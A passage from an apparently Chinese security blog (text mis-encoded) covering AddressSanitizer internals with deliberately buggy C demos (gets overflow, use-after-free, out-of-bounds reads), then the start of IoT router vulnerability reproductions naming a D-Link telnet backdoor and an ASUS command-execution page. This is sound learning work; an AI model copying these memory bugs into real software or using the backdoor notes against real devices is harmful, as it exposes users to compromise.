class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># long load8(long *a) &#123; return *a; &#125;</span><br><span class="hljs-attribute">0000000000000030</span> &lt;load8&gt;:<br>  <span class="hljs-attribute">30</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f8             mov    %rdi,%rax<br>  <span class="hljs-attribute">33</span>:<span class="hljs-number">48</span> c1 e8 <span class="hljs-number">03</span>          shr    $<span class="hljs-number">0</span>x3,%rax<br>  <span class="hljs-attribute">37</span>:<span class="hljs-number">80</span> b8 <span class="hljs-number">00</span> <span class="hljs-number">80</span> ff <span class="hljs-number">7</span>f <span class="hljs-number">00</span> cmpb   $<span class="hljs-number">0</span>x0,<span class="hljs-number">0</span>x7fff8000(%rax)<br>  <span class="hljs-attribute">3e</span>:<span class="hljs-number">75</span> <span class="hljs-number">04</span>                jne    <span class="hljs-number">44</span> &lt;load8+<span class="hljs-number">0</span>x14&gt;<br>  <span class="hljs-attribute">40</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">07</span>             mov    (%rdi),%rax   &lt;&lt;&lt;&lt;&lt;&lt; original load<br>  <span class="hljs-attribute">43</span>:c3                   retq   <br>  <span class="hljs-attribute">44</span>:<span class="hljs-number">52</span>                   push   %rdx<br>  <span class="hljs-attribute">45</span>:e8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  __asan_report_load8<br><span class="hljs-comment"># int  load4(int *a)  &#123; return *a; &#125;</span><br><span class="hljs-attribute">0000000000000000</span> &lt;load4&gt;:<br>   <span class="hljs-attribute">0</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f8             mov    %rdi,%rax<br>   <span class="hljs-attribute">3</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fa             mov    %rdi,%rdx<br>   <span class="hljs-attribute">6</span>:<span class="hljs-number">48</span> c1 e8 <span class="hljs-number">03</span>          shr    $<span class="hljs-number">0</span>x3,%rax<br>   <span class="hljs-attribute">a</span>:<span class="hljs-number">83</span> e2 <span class="hljs-number">07</span>             and    $<span class="hljs-number">0</span>x7,%edx<br>   <span class="hljs-attribute">d</span>:<span class="hljs-number">0</span>f b6 <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">80</span> ff <span class="hljs-number">7</span>f movzbl <span class="hljs-number">0</span>x7fff8000(%rax),%eax<br>  <span class="hljs-attribute">14</span>:<span class="hljs-number">83</span> c2 <span class="hljs-number">03</span>             add    $<span class="hljs-number">0</span>x3,%edx<br>  <span class="hljs-attribute">17</span>:<span class="hljs-number">38</span> c2                cmp    %al,%dl<br>  <span class="hljs-attribute">19</span>:<span class="hljs-number">7</span>d <span class="hljs-number">03</span>                jge    <span class="hljs-number">1</span>e &lt;load4+<span class="hljs-number">0</span>x1e&gt;<br>  <span class="hljs-attribute">1b</span>:<span class="hljs-number">8</span>b <span class="hljs-number">07</span>                mov    (%rdi),%eax    &lt;&lt;&lt;&lt;&lt;&lt; original load<br>  <span class="hljs-attribute">1d</span>:c3                   retq   <br>  <span class="hljs-attribute">1e</span>:<span class="hljs-number">84</span> c0                test   %al,%al<br>  <span class="hljs-attribute">20</span>:<span class="hljs-number">74</span> f9                je     <span class="hljs-number">1</span>b &lt;load4+<span class="hljs-number">0</span>x1b&gt;<br>  <span class="hljs-attribute">22</span>:<span class="hljs-number">50</span>                   push   %rax<br>  <span class="hljs-attribute">23</span>:e8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  __asan_report_load4<br></code></pre></td></tr></table></figure><h1 id="0x2-æŠ¥é”™æŸ¥çœ‹"><a href="#0x2-æŠ¥é”™æŸ¥çœ‹" class="headerlink" title="0x2: æŠ¥é”™æŸ¥çœ‹"></a>0x2: æŠ¥é”™æŸ¥çœ‹</h1><p>mdï¼Œå†™äº†åŠå¤©ï¼Œæ‰å‘ç°githubé‡Œæœ‰å®˜æ–¹ç»™çš„demoï¼Œè‰äº†</p><p>ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡</p><h2 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h2><p>demoï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> stack1[<span class="hljs-number">0x10</span>];<br>  <span class="hljs-type">char</span> stack2[<span class="hljs-number">0x10</span>];<br>  <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome to korey&#x27;s test&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pls input: &quot;</span>);<br>  <span class="hljs-built_in">gets</span>(stack1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done&quot;</span>);<br>  <br>  <span class="hljs-keyword">return</span> stack2[<span class="hljs-number">0x10</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“è¾“å…¥çš„å†…å®¹è¾ƒå°‘æ—¶ï¼Œä¼šæ­£å¸¸å‡ºç°stack overflowçš„æŠ¥é”™</p><p><img src="/img/ASAN/1.png" alt="img"></p><p><img src="/img/ASAN/2.png" alt="img"></p><p>å›¾ä¸€æ¡†ä¸€ï¼š</p><ul><li>æ¼æ´ç±»å‹â€”â€”stack overflow</li><li>æŠ¥é”™åœ°å€ï¼Œpcã€spã€bpç­‰å¯„å­˜å™¨çš„å€¼</li><li>åœ¨çº¿ç¨‹T0æ ˆåœ°å€0x7ffff0291120è¿›è¡Œreadæ“ä½œæ—¶ï¼Œæ£€æµ‹åˆ°é”™è¯¯</li><li>é”™è¯¯ä»£ç ä½äºstack.cçš„14è¡Œ</li></ul><p>å›¾ä¸€æ¡†äºŒ</p><ul><li>æ¼æ´åœ°å€0x7ffff0291120ä½äºT0çº¿ç¨‹çš„æ ˆä¸­åç§»80å¤„ï¼Œå¹¶æŒ‡å‡ºæ¼æ´å­˜åœ¨çš„å˜é‡</li></ul><p>å›¾äºŒ</p><ul><li>shadow memory å±•ç¤º</li><li>å› ä¸º1å­—èŠ‚çš„shadow memoryå¯¹åº”8å­—èŠ‚çš„mem memoryï¼Œæ‰€ä»¥<code>f1 f1 f1 f1</code>ä¸<code>f2 f2</code>ä¹‹é—´çš„åŒºåŸŸä¸º<code>stack1</code>å¯¹åº”çš„shadow memoryï¼Œ<code>stack2</code>åŒç†</li><li>å› ä¸ºé€ æˆæ¼æ´çš„æ—¶<code>return stack2[0x10];</code>ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªf3è¢«æ ‡è¯†ï¼Œè¡¨ç¤ºæ­¤å¤„æŠ•æ¯’å‘ç°æ¼æ´</li></ul><p>æ­¤å›¾çš„ä¸‹åŠéƒ¨åˆ†åˆ™ä¸ºå„ç§ç¬¦å·ä»£è¡¨çš„å«ä¹‰</p><p>å› ä¸ºdemoä¸­ä½¿ç”¨äº†getï¼Œå°è¯•è¾“å…¥å¤§é‡æ•°æ®é€ æˆæ ˆæº¢å‡º</p><p><img src="/img/ASAN/3.png" alt="img"></p><p>ä½†å¥½åƒå¹¶ä¸èƒ½è¾“å‡ºlogä¿¡æ¯</p><p>é‚£å°±è¿›gdbåº·åº·</p><p>å¯ä»¥çœ‹åˆ°åœ¨æœ€åè°ƒç”¨__asan_reportæ—¶ï¼Œå‡½æ•°å‚æ•°å·²ç»æŒ‡å‘äº†dirty dataï¼Œé‚£å°±è¯´æ˜åŸæœ¬æ­£å¸¸è¿è¡Œæ—¶ASANå¤šå¼€è¾Ÿå‡ºæ¥çš„æ ˆç©ºé—´è¢«æ¶æ„æ“ä½œæ—¶ä¼šå¯¼è‡´åŠŸèƒ½crash</p><p><img src="/img/ASAN/4.png" alt="img"></p><p>ç¬”è€…åæ¥åˆè¯•è¯•äº†åªæœ‰getså‡½æ•°çš„demoï¼Œå‘ç°å°±ç®—ç”¨ASANç¼–è¯‘ä¹Ÿåªä¼šæŠ¥å‡ºstack smash</p><p>é“¸å¸ç¬”è€…è®¤ä¸ºï¼ŒASANæ›´å€¾å‘äºåœ¨ç¼–è¯‘çš„æ—¶å€™å°±æ ‡æ³¨å‡ºæ¼æ´ï¼Œå½“æ‰§è¡Œåˆ°è¿™ä¸ªæ¼æ´æ—¶å¼•å‘æŠ¥é”™ï¼Œå°±åƒåœ¨fuzzä¸­ï¼Œè¿™å¯èƒ½ç®—æ˜¯ä¸ªä»£ç è¦†ç›–ç‡çš„é—®é¢˜ï¼Œæ‰§è¡Œåˆ°æ¼æ´å­˜åœ¨åˆ†æ”¯ä¾¿crashã€‚è€Œå¯¹äºgetsè¿™ç§ä¾èµ–ç”¨æˆ·è¾“å…¥çš„å±é™©å‡½æ•°ï¼ŒASANåœ¨ç¼–è¯‘çš„æ—¶å€™å¹¶ä¸èƒ½ç²¾ç¡®å®šä¹‰å…¶å±é™©æ€§ï¼Œæ•…å¹¶æ²¡æœ‰è¿›è¡Œæ£€æµ‹ã€‚</p><p>ç¬”è€…çš„è¯´æ³•å¯èƒ½æœ‰å¤±åé¢‡ï¼Œå„ä½å¤§å¸ˆå‚…ä»¬å¦‚æœæœ‰ä»€ä¹ˆæƒ³æ³•å¯ä»¥åœ¨è¯„è®ºåŒºç•™è¨€å‘œå‘œå‘œã€‚</p><h2 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h2><p>å’Œstack overflowç±»ä¼¼ï¼Œå°±ä¸ç»†è®²äº†</p><p>demo</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *heap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>  <span class="hljs-type">char</span> test =  heap[<span class="hljs-number">0x10</span>];<br>  <br>  <span class="hljs-built_in">free</span>(heap);<br>  *heap = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ASAN_log</p><p><img src="/img/ASAN/5.png" alt="img"></p><h2 id="global-buffer-overflow"><a href="#global-buffer-overflow" class="headerlink" title="global buffer overflow"></a>global buffer overflow</h2><p>åŒä¸Š</p><p>demo:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">char</span> global[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> global[<span class="hljs-number">0x10</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ASAN_logå¾ˆå¥‡æ€ª</p><p><img src="/img/ASAN/6.png" alt="img"></p><p>ç‰¹åˆ«æ˜¯æ˜æ˜gloablæ‰0x10ä¸ªå­—èŠ‚å¤§å°ï¼Œshadow memoryå‰é¢é‚£ä¹ˆå¤§ä¸€å—åŒºåŸŸ</p><p>ä¸”å½“æˆ‘å°†å½“demo æ¢æˆ<code>return global[-1]</code>æ—¶ï¼Œç›´æ¥æ˜¾ç¤ºæ­£å¸¸äº†ã€‚</p><p>ï¼Ÿï¼Ÿï¼Ÿ</p><p>å¦‚æœæœ‰å¸ˆå‚…çŸ¥é“æ˜¯ä»€ä¹ˆæƒ…å†µèƒ½ä¸èƒ½è”ç³»ä¸€ä¸‹é“¸å¸ç¬”è€…å‘œå‘œ</p><p>è·ªè°¢</p><h2 id="use-after-free"><a href="#use-after-free" class="headerlink" title="use after free"></a>use after free</h2><p>demo:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *heap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br> <br>  <span class="hljs-built_in">free</span>(heap);<br>  <span class="hljs-keyword">return</span> heap[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>ASAN_log</p><p><img src="/img/ASAN/7.png" alt="img"></p><h2 id="memory-leak"><a href="#memory-leak" class="headerlink" title="memory leak"></a>memory leak</h2><p>å†…å­˜æ³„éœ²å…¶å®å°±æ˜¯å†…å­˜åˆ†é…åæ²¡æœ‰é‡Šæ”¾ï¼Œå¯¼è‡´å†…å­˜ç©ºé—´ä¸­æœ‰æ•°æ®æ®‹ç•™</p><p>demo:</p><p>æ²¡æœ‰freeæ‰å †å—</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *heap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ASAN_log</p><p><img src="/img/ASAN/8.png" alt="img"></p><h2 id="stack-use-after-scope"><a href="#stack-use-after-scope" class="headerlink" title="stack use after scope"></a>stack use after scope</h2><p>stack-use-after-scopeæŒ‡çš„æ˜¯è¶…å‡ºå®šä¹‰åŸŸå¤–å¯¹å±€éƒ¨å˜é‡æ“ä½œ</p><p>demo:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> *p = <span class="hljs-number">0</span>;<br>  <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  &#123;<br>    <span class="hljs-type">int</span> test = <span class="hljs-number">0</span>;<br>    p = &amp;test;<br>  &#125;<br>  <br>  *p = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆç”¨volatileæŒ‡å®šä¸€ä¸‹æŒ‡é’ˆpæ¯æ¬¡æ“ä½œå‰éƒ½é‡æ–°è¯»ä¸€ä¸‹å€¼</p><p>ASAN_log</p><p><img src="/img/ASAN/9.png" alt="img"></p><h2 id="stack-use-after-return"><a href="#stack-use-after-return" class="headerlink" title="stack use after return"></a>stack use after return</h2><p>å’Œstack-use-after-scopeç±»ä¼¼</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">char</span> *p;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>  p = &amp;buffer[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">func</span>();<br>  <span class="hljs-keyword">return</span> p[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ASANé»˜è®¤æ˜¯ä¸æ£€æµ‹è¿™ä¸ªé”™è¯¯çš„ï¼Œæ‰€ä»¥è¦ä½¿ç”¨<code>ASAN_OPTIONS=detect_stack_use_after_return=1</code>å¼€å¯</p><p>ASAN_log</p><p><img src="/img/ASAN/10.png" alt="img"></p><h1 id="0x3-ä¸€äº›å°bug"><a href="#0x3-ä¸€äº›å°bug" class="headerlink" title="0x3: ä¸€äº›å°bug"></a>0x3: ä¸€äº›å°bug</h1><p>ä¸€ï¼š</p><p>å¯ä»¥çœ‹åˆ°ï¼Œé’ˆå¯¹æº¢å‡ºç±»å‹çš„æ¼æ´æ—¶ï¼ŒASANåœ¨shadow memory â€˜s left or rightæŠ•æ¯’çš„åŒºåŸŸæ˜¯æœ‰é™çš„ï¼Œè‹¥æº¢å‡ºçš„èŒƒå›´è¶…å‡ºæŠ•æ¯’çš„èŒƒå›´æˆ–è€…æ°å¥½è½åœ¨åˆ«çš„å¯ç”¨å†…å­˜å¯¹åº”çš„shadow memoryï¼Œåˆ™ä¸ä¼šæŠ¥é”™</p><p>äºŒï¼š</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œä¾‹å¦‚åœ¨x86_64è¿›è¡Œå †å—åˆ†é…æ—¶ï¼Œä¸€ä¸ªchunkçš„å‰8ä¸ªå­—èŠ‚æ˜¯å¯ä»¥è¢«å‰ä¸€chunkä½¿ç”¨çš„ï¼Œä½†è¿™å´ä¼šè¢«ASANæ£€æµ‹å‡ºheap overflow</p><p><img src="/img/ASAN/11.png" alt="img"></p><p>ä¸‰ï¼š</p><p>å½“å†…å­˜åˆ†é…æœª8å­—èŠ‚å¯¹é½æ—¶</p><p><img src="/img/ASAN/12.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°è¿™è¾¹æœ‰ä¸€ä¸ªshadow memoryä¸º<code>04</code>ï¼Œç»“åˆä¸Šæ–‡æ‰€æåˆ°çš„shadow memoryçš„9é’Ÿå¯èƒ½å€¼ï¼Œå¯çŸ¥æ­¤å¤„æœ‰4ä¸ªå­—èŠ‚è¢«æŠ•æ¯’</p><h1 id="0x4-æœ€åçš„æœ€å"><a href="#0x4-æœ€åçš„æœ€å" class="headerlink" title="0x4: æœ€åçš„æœ€å"></a>0x4: æœ€åçš„æœ€å</h1><p>èŠ±äº†ä¸¤å¤©æ—¶é—´å¤§è‡´äº†è§£äº†ä¸€ä¸‹ASANï¼Œæ€»çš„æ¥è¯´è¿™ä¸ªå·¥å…·è¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼Œè™½ç„¶æœ‰äº›å°é—®é¢˜ï¼Œä½†è¿™å¾ˆå¤§ä¸€éƒ¨åˆ†åŸå› æ˜¯è¯­è¨€å¯¼è‡´çš„ã€‚</p><p>å…¶å®å®˜æ–¹çš„æ–‡æ¡£å†™çš„è¶…çº§è¯¦ç»†ï¼Œå„ä½å¤§å¸ˆå‚…å¦‚æœæƒ³æ·±å…¥äº†è§£ASANå¯ä»¥ç›´æ¥å»googleçš„<a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">ä»“åº“</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ASAN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iotæ¼æ´å¤ç°å°è®°</title>
    <link href="/2023/08/05/iot%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/05/iot%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0: å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0: å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>ç›´æ¥è½æ¼æ´å¤ç°äº†</p><p>æäº†ä¸ªiotsecçš„è´¦å·ï¼Œè¿™è¾¹å¤ç°çš„ä¸»è¦æ˜¯é‡Œé¢ioté¶åœºé‡Œçš„æ´</p><p>æ€»æ„Ÿè§‰ä»–TMé¶æœºæœ‰å¤§é—®é¢˜ï¼Œæ‰€ä»¥ç¬”è€…è¿™è®°å½•çš„å…¨ä¸ºæœ¬åœ°remake</p><h1 id="0x1-å¤§è‡´çš„æ¼æ´æŒ–æ˜æµç¨‹"><a href="#0x1-å¤§è‡´çš„æ¼æ´æŒ–æ˜æµç¨‹" class="headerlink" title="0x1: å¤§è‡´çš„æ¼æ´æŒ–æ˜æµç¨‹"></a>0x1: å¤§è‡´çš„æ¼æ´æŒ–æ˜æµç¨‹</h1><p>ç¬”è€…å¸Œæœ›åœ¨è¿™äºŒä¸‰åä¸ªæ¼æ´å¤ç°å®Œåèƒ½æ€»ç»“å‡ºä¸€ä¸ªé«˜æ•ˆç‡çš„iotæ¼æ´æŒ–æ˜æµç¨‹</p><p>ä½†æš‚æ—¶è¿˜æ²¡ä»€ä¹ˆçµæ„Ÿå‘œå‘œå‘œå‘œ</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>8-10ï¼ŒJulyï¼šè¯•äº†å‡ ä¸ªåé—¨æ¼æ´ï¼Œå…ˆç”¨firmwalkerçœ‹çœ‹æœ‰æ²¡æœ‰æ•æ„Ÿæ–‡ä»¶</p><p>10-15ï¼ŒJulyï¼šæŒ–äº†totolink T10ï¼Œç†Ÿæ‚‰äº†ä»¥mqttä¸ºä¸»é¢˜çš„webserver</p><p>17-20ï¼ŒJulyï¼štotolink A720Rï¼Œtotolinkå¤§é‡å­˜åœ¨çš„æœªæˆæƒè®¤è¯æ¼æ´ï¼Œä»¥åŠä»¥httpä¸ºä¸»ä½“çš„webserverï¼Œcstecgi.cgi</p><p>8-13ï¼ŒAugustï¼šTenda AX3ï¼Œpatch binary of httpdæ¥å¯åŠ¨webserverï¼Œå¾ˆæ­£å¸¸çš„æœåŠ¡</p><p>15-17ï¼ŒAugustï¼šä¸€ç³»åˆ—DLINKè®¾å¤‡å­˜åœ¨çš„é—®é¢˜ï¼Œç‰µæ‰¯åˆ°upnpåè®®ï¼Œç”¨qemuå¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥ç¬”è€…ç›´æ¥ç”¨FirmAEè¿›è¡Œæ¨¡æ‹Ÿï¼Œä¸”FirmAEçš„-dæ¨¡å¼èƒ½æ‹¿shellå’Œpatch pidè°ƒè¯•ï¼Œå¯¹äºç±»ä¼¼cgiè¿™ç±»å­˜åœ¨æ—¶é—´å¾ˆçŸ­çš„è¿›ç¨‹ï¼Œwinmtå¸ˆå‚…çš„æ–¹æ³•æ˜¯patchæ‰ä¸€ä¸ªåœ°æ–¹ï¼Œä½¿ç¨‹åºè¿›å…¥æ— é™å¾ªç¯ä»è€Œä½¿è¿›ç¨‹å¡ä½ï¼Œç»å¦™çš„æƒ³æ³•ï¼ï¼</p><h1 id="0x2-Remake"><a href="#0x2-Remake" class="headerlink" title="0x2: Remake"></a>0x2: Remake</h1><h2 id="åé—¨æ¼æ´"><a href="#åé—¨æ¼æ´" class="headerlink" title="åé—¨æ¼æ´"></a>åé—¨æ¼æ´</h2><p>è¿™ç§çº¯çº¯å°±æ˜¯ç¦åˆ©å§¬ï¼ˆå¥½åƒæœ‰ç‚¹å¥‡æ€ªï¼Œä½†è¿™ä¹ˆè¯´æ˜¯ä¸€ç‚¹é—®é¢˜æ²¡æœ‰ï¼‰</p><h3 id="D-Link-DIR815åé—¨æ¼æ´"><a href="#D-Link-DIR815åé—¨æ¼æ´" class="headerlink" title="D-Link DIR815åé—¨æ¼æ´"></a>D-Link DIR815åé—¨æ¼æ´</h3><p>æ‹¿firmwalkerä¸€æ‰«å‘ç°å­˜åœ¨&#x2F;etc&#x2F;init0.d&#x2F;S80telnetd.sh</p><p><img src="/img/iot1/0.png" alt="img"></p><p>ç„¶åå°±telnetè®¿é—®ä¸€ä¸‹å°±å¥½äº†</p><p>æŠ½è±¡çš„ä¸€æ‰¹</p><h3 id="ASUS-RT-N10-ASUS-RT-N10-D1-æˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#ASUS-RT-N10-ASUS-RT-N10-D1-æˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="ASUS RT-N10&amp;ASUS RT-N10 D1 æˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´"></a>ASUS RT-N10&amp;ASUS RT-N10 D1 æˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´</h3><p>firmwalkeræ‰«å®Œæ²¡ä»€ä¹ˆå‘ç°</p><p>æ‰¾ä¸€ä¸‹å›ºä»¶ä¸­æœ‰æ²¡æœ‰syscmdè¿™ç§æ•æ„Ÿå­—ç¬¦ä¸²ï¼Œè¿˜çœŸæœ‰</p><p><img src="/img/iot1/1.png" alt="img"></p><p>é‚£ç”¨FirmAEæ¨¡æ‹Ÿä¸€ä¸‹ï¼Œè¯•ç€è®¿é—®ä¸€ä¸‹è¿™ä¸ªMain_AdmStatus_Content.asp</p><p><img src="/img/iot1/2.png" alt="img"></p><p>éšä¾¿æ</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="Tenda-AC15å‘½ä»¤æ‰§è¡Œï¼ˆgoform-setUsbUnloadï¼‰"><a href="#Tenda-AC15å‘½ä»¤æ‰§è¡Œï¼ˆgoform-setUsbUnloadï¼‰" class="headerlink" title="Tenda AC15å‘½ä»¤æ‰§è¡Œï¼ˆgoform&#x2F;setUsbUnloadï¼‰"></a>Tenda 